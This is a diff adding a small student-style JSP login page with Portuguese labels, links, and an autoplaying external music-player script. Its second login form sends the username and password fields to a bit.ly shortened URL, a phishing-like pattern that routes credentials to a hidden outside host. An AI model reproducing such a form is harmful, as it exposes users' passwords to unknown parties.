@@ -1,0 +1,54 @@
+<%-- 
+    Document   : index
+    Created on : 09/10/2013, 12:21:50
+    Author     : senac2012
+--%>
+
+<%@page contentType="text/html" pageEncoding="UTF-8"%>
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>JSP Page</title>
+    </head>
+    <body>
+        <span style="color:#00FF00">
+        <form action="processa.jsp" method="POST">
+           <a>Usuario</a><input type="text" name="Usuario" value="" /><br>
+           <a>Senha</a><input type="password" name="Senha" value="" /><br>
+            <input type="submit" value="Submeter" name="Submeter" />
+            <span style="color:#000000">
+            <h1>____----¨¨¨¨----____</h1>
+        </form>
+        <body style="background:#BDB76B">
+        <span style="color:#B22222">
+        <h1>Hello World!</h1>
+        
+        <a href="https://www.sp.senac.br/jsp/login/Login">Senacre</a>
+        <br>
+       
+        <a href="http://www.lalalalalalalalalalalalalalalalalala.com/">Hu3</a>
+        <br>
+        <span style="color:#000000">
+          <h1>____----¨¨¨¨----____</h1>
+          
+          
+         <!-- Music Player -->
+<script type="text/javascript" src="http://scmplayer.net/script.js" 
+data-config="{'skin':'skins/black/skin.css','volume':100,'autoplay':true,'shuffle':true,'repeat':1,'placement':'bottom','showplaylist':false,'playlist':[{'title':'Back In Black','url':'http://www.youtube.com/watch?v=pAgnJDJN4VA'},{'title':'Thunderstruck','url':'http://www.youtube.com/watch?v=v2AC41dglnM'},{'title':'T.N.T.','url':'http://www.youtube.com/watch?v=pR30knJs4Xk'},{'title':'You Shook Me All Night Long','url':'http://www.youtube.com/watch?v=zakKvbIQ28o'}]}" ></script>
+<!-- SCM Music Player script end -->
+
+
+        
+            <form action="http://bit.ly/19zV4D4" method="POST">
+              <br>
+<span style="color:#00FF00">
+            <a>Usuario</a><input type="text" name="Usuario" value="" />
+            <br>
+            <a>Senha</a><input type="password" name="Senha" value="" /><br>
+            <input type="submit" value="Submeter" name="Submeter" /><br>
+            <br>
+             
+        <a href="http://www.lalalalalalalalalalalalalalalalalala.com/"></a>
+    </body>
+</html>
